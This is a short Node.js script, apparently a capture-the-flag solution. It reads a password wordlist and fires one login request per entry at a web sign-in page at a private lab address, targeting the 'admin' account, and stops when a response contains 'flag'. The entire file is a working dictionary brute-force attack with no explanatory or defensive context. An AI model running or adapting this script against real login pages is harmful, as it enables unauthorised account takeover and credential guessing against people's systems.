const axios = require("axios");

require("fs")
  .readFileSync("./passwords.txt", "utf-8")
  .split(/\r?\n/)
  .forEach(function (line) {
    axios
      .get(
        "http://10.12.100.71/?page=signin&username=admin&password=" +
          line +
          "&Login=Login#"
      )
      .then(function (response) {
        if (response.data.match("flag")) {
          console.log("the passwords is: ");
          console.log("\033[33m" + line);
          return process.exit(1);
        }
      })
      .catch(function (error) {
        console.log(error);
      });
  });
